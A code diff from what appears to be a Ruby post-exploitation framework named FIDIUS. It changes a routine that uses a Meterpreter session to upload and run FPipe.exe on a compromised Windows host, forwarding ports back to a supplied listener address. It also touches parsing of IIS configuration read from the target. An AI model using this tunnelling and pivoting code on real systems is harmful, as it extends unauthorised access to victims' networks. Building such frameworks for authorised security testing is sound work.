@@ -25,11 +25,11 @@ module FIDIUS
         analyzeConfig tmpDown("#{Dir.pwd}", "#{iis_path}\\MetaBase.xml") if iis_running
       end
 
-      def establishPortFwd
+      def establishPortFwd lhost
         script_path = Msf::Sessions::Meterpreter.find_script_path("uploadexec")
         #FIXME Hartgecoded IP
         #args = ['-e',"#{RAILS_ROOT}/vendor/FPipe.exe", '-o', "-l 3000 -r 3000 #{@pwnlink[0,@pwnlink.rindex(':')]}", lhost]
-        args = ['-e',"#{RAILS_ROOT}/vendor/FPipe.exe",'-p','C:\\', '-o', "-l 8081 -r 8080 192.168.178.22"]
+        args = ['-e',"#{RAILS_ROOT}/vendor/FPipe.exe",'-p','C:\\', '-o', "-l 8081 -r 8080 #{lhost} -v"]
         puts "run: #{script_path} #{args}"
         @session.execute_file(script_path, args)
       end
@@ -47,12 +47,12 @@ module FIDIUS
         tmp_path_array.each do |line|
           path = line.gsub("\"",'')
           path = path.downcase.sub("path=",'')
-          path = path.lstrip.gsub(/\s/,'')
+          path = path.gsub("\n",'').gsub("\r",'').strip
           pathes_to_search_in << path
         end
         tmp_name_array.each do |line|
           name = line.gsub("\"",'')
-          name = name.gsub(/\s/,'')
+          name = name.gsub("\n",'').gsub("\r",'').strip
           name = name.downcase.sub("defaultdoc=",'')
           default_doc_names = default_doc_names - name.split(',')
           default_doc_names = default_doc_names + name.split(',')
